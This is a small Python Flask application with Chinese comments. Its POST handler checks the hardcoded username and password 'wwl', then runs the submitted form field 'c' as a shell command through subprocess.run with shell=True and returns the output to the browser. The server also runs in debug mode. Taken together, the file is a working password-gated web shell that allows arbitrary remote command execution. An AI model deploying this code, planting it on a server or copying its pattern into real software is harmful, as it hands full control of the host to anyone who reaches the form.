from flask import Flask, request, render_template
import os, subprocess

app = Flask(__name__)

@app.route('/')
def index():
    # 显示一个简单的表单，让用户输入一些数据
    return render_template('form.html')

@app.route('/', methods=['POST'])
def process_form():
    # 处理表单提交的数据
    c = request.form['c']
    u = request.form['u']
    p = request.form['p']
    if u == "wwl" and p == "wwl":
        # 打印输出数据
        print('c:', c)
        # 返回一个响应给用户，告诉他们数据已经处理完毕
        
        # 执行Linux命令，并将输出内容存储在result变量中
        result = subprocess.run(c, shell=True, capture_output=True, text=True)
        # 输出命令的输出内容
        print(result.stdout)
        # 输出错误输出内容
        print(result.stderr)
        return result.stdout + result.stderr

if __name__ == '__main__':
    app.run(debug=True)
